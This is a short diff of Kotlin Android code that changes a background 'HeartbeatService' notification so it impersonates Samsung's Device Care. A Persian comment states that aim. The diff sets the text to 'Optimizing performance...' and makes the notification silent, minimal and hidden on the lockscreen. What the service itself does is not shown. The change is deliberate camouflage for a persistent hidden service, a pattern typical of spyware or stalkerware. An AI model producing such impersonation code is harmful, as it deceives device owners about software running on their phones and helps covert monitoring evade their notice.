@@ -74,27 +74,30 @@ class HeartbeatService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "System Services",
+                "Device care",  // ⭐ شبیه Samsung Device Care
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Background system services"
+                description = "Keeping your device healthy"
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
                 setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
         }
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Service")
-            .setContentText("Running in background")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setContentTitle("Device care")
+            .setContentText("Optimizing performance...")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)  // آیکون sync
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setShowWhen(false)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setSilent(true)
             .build()
 
         startForeground(NOTIFICATION_ID, notification)
